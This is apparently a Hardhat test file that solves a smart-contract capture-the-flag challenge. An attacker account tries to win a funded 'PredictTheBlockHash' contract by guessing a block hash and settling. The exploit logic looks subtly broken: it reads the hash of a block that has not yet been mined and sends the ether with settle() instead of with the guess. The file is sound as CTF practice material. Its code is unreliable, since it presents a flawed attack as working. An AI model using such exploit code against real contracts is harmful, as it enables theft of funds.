import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils , provider } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const block = await provider.getBlockNumber();
    const currentBlockNumber = await provider.getBlock(block + 1);
    const answer = currentBlockNumber.hash;

    const tx = await target.connect(attacker).lockInGuess(answer);
    const settling = await target.connect(attacker).settle(answer,{value: utils.parseEther('1')});

    expect(await target.isComplete()).to.equal(true);
  });
});
